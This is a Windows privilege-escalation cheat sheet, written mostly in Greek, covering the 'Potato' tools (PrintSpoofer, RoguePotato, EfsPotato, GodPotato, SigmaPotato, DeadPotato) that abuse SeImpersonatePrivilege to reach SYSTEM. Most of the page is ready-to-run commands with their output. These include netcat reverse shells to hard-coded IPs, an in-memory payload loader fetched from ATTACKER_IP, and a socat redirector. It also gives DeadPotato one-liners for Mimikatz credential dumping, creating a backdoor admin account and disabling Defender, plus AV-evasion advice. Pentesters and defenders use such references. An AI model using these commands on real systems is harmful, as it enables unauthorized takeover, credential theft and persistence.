# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Σχετικές σελίδες για υπόβαθρο και χειροκίνητες τεχνικές:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Απαιτήσεις και συνηθισμένες παγίδες

Όλες οι παρακάτω τεχνικές στηρίζονται στην κατάχρηση μιας privileged υπηρεσίας με δυνατότητα impersonation από ένα context που κατέχει κάποιο από τα παρακάτω δικαιώματα:

- SeImpersonatePrivilege (το πιο συνηθισμένο) ή SeAssignPrimaryTokenPrivilege
- High integrity δεν είναι απαραίτητο εάν το token έχει ήδη SeImpersonatePrivilege (τυπικό για πολλούς service accounts όπως IIS AppPool, MSSQL, κ.λπ.)

Ελέγξτε τα privileges γρήγορα:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:
- Εάν το shell σας τρέχει υπό περιορισμένο token που στερείται SeImpersonatePrivilege (συχνό για Local Service/Network Service σε ορισμένα περιβάλλοντα), επανακτήστε τα προεπιλεγμένα προνόμια του λογαριασμού χρησιμοποιώντας FullPowers, και μετά τρέξτε ένα Potato. Παράδειγμα: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- Το PrintSpoofer χρειάζεται την υπηρεσία Print Spooler ενεργή και προσβάσιμη μέσω του τοπικού RPC endpoint (spoolss). Σε σκληροποιημένα περιβάλλοντα όπου ο Spooler είναι απενεργοποιημένος μετά το PrintNightmare, προτιμήστε RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- Το RoguePotato απαιτεί έναν OXID resolver προσβάσιμο μέσω TCP/135. Εάν το egress είναι μπλοκαρισμένο, χρησιμοποιήστε έναν redirector/port-forwarder (βλέπε παράδειγμα παρακάτω). Παλαιότερες builds απαιτούσαν το flag -f.
- Τα EfsPotato/SharpEfsPotato εκμεταλλεύονται το MS-EFSR· αν μια pipe είναι μπλοκαρισμένη, δοκιμάστε εναλλακτικές pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Το Error 0x6d3 κατά την RpcBindingSetAuthInfo συνήθως υποδηλώνει άγνωστη/μη υποστηριζόμενη υπηρεσία RPC authentication· δοκιμάστε άλλη pipe/transport ή βεβαιωθείτε ότι η στοχευόμενη υπηρεσία τρέχει.
- Τα "Kitchen-sink" forks όπως το DeadPotato πακέτοποιούν επιπλέον payload modules (Mimikatz/SharpHound/Defender off) που γράφουν στο δίσκο· αναμένετε υψηλότερη ανίχνευση από EDR σε σύγκριση με τα λιτά πρωτότυπα.

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Σημειώσεις:
- Μπορείτε να χρησιμοποιήσετε -i για να δημιουργήσετε μια διαδραστική διεργασία στην τρέχουσα κονσόλα, ή -c για να εκτελέσετε ένα one-liner.
- Απαιτεί την υπηρεσία Spooler. Εάν είναι απενεργοποιημένη, αυτό θα αποτύχει.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Εάν η εξερχόμενη θύρα 135 είναι μπλοκαρισμένη, pivot τον OXID resolver μέσω socat στον redirector σας:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato είναι μια νεότερη primitive κατάχρησης COM που κυκλοφόρησε στα τέλη του 2022 και στοχεύει την υπηρεσία **PrintNotify** αντί του Spooler/BITS. Το δυαδικό αρχείο δημιουργεί μια παρουσία του PrintNotify COM server, αντικαθιστά το `IUnknown` με ένα ψεύτικο και στη συνέχεια ενεργοποιεί μια privileged callback μέσω του `CreatePointerMoniker`. Όταν η υπηρεσία PrintNotify (που εκτελείται ως **SYSTEM**) συνδεθεί πίσω, η διεργασία διπλασιάζει το επιστρεφόμενο token και εκκινεί το δοθέν payload με πλήρη προνόμια.

Βασικές σημειώσεις λειτουργίας:

* Λειτουργεί σε Windows 10/11 και Windows Server 2012–2022 εφόσον η υπηρεσία Print Workflow/PrintNotify είναι εγκατεστημένη (παρέχεται ακόμη και όταν ο legacy Spooler είναι απενεργοποιημένος μετά το PrintNightmare).
* Απαιτεί το περιβάλλον κλήσης να έχει **SeImpersonatePrivilege** (τυπικό για IIS APPPOOL, MSSQL και scheduled-task service accounts).
* Δέχεται είτε μια άμεση εντολή είτε διαδραστική λειτουργία ώστε να παραμείνετε στην αρχική κονσόλα. Παράδειγμα:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Επειδή βασίζεται αποκλειστικά σε COM, δεν απαιτούνται named-pipe listeners ή εξωτερικοί redirectors, καθιστώντας το drop-in αντικατάσταση σε hosts όπου το Defender μπλοκάρει το RPC binding του RoguePotato.

Χειριστές όπως ο Ink Dragon εκτελούν το PrintNotifyPotato αμέσως μετά την απόκτηση ViewState RCE σε SharePoint για να μεταβούν από τον worker `w3wp.exe` σε SYSTEM πριν εγκαταστήσουν το ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Συμβουλή: Αν ένας pipe αποτύχει ή το EDR το μπλοκάρει, δοκιμάστε τα άλλα υποστηριζόμενα pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Σημειώσεις:
- Λειτουργεί σε Windows 8/8.1–11 και Server 2012–2022 όταν είναι παρόν το SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

Το DCOMPotato παρέχει δύο παραλλαγές που στοχεύουν service DCOM objects που έχουν ως προεπιλογή το RPC_C_IMP_LEVEL_IMPERSONATE. Build ή χρησιμοποιήστε τα παρεχόμενα binaries και εκτελέστε την εντολή σας:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ενημερωμένο fork του GodPotato)

SigmaPotato προσθέτει σύγχρονες βελτιώσεις όπως in-memory execution μέσω .NET reflection και PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Ενσωματωμένη σημαία reverse shell `--revshell` και αφαίρεση του ορίου 1024 χαρακτήρων του PowerShell ώστε να μπορείτε να εκτοξεύσετε μεγάλα AMSI-bypassing payloads με μία κίνηση.
- Reflection-friendly σύνταξη (`[SigmaPotato]::Main()`), συν ένα πρόχειρο AV evasion τέχνασμα μέσω `VirtualAllocExNuma()` για να μπερδέψει απλά heuristics.
- Ξεχωριστό `SigmaPotatoCore.exe` μεταγλωττισμένο για .NET 2.0 για περιβάλλοντα PowerShell Core.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato keeps the GodPotato OXID/DCOM impersonation chain but bakes in post-exploitation helpers so operators can immediately take SYSTEM and perform persistence/collection without additional tooling.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — εκκινεί αυθαίρετη εντολή ως SYSTEM.
- `-rev <ip:port>` — γρήγορο reverse shell.
- `-newadmin user:pass` — δημιουργεί τοπικό admin για persistence.
- `-mimi sam|lsa|all` — ρίχνει και τρέχει Mimikatz για να dump credentials (γράφει στον δίσκο, πολύ noisy).
- `-sharphound` — τρέχει SharpHound collection ως SYSTEM.
- `-defender off` — απενεργοποιεί την real-time protection του Defender (πολύ noisy).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Επειδή περιλαμβάνει επιπλέον binaries, αναμένετε περισσότερα AV/EDR flags· χρησιμοποιήστε τα πιο ελαφριά GodPotato/SigmaPotato όταν το stealth έχει σημασία.

## Αναφορές

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
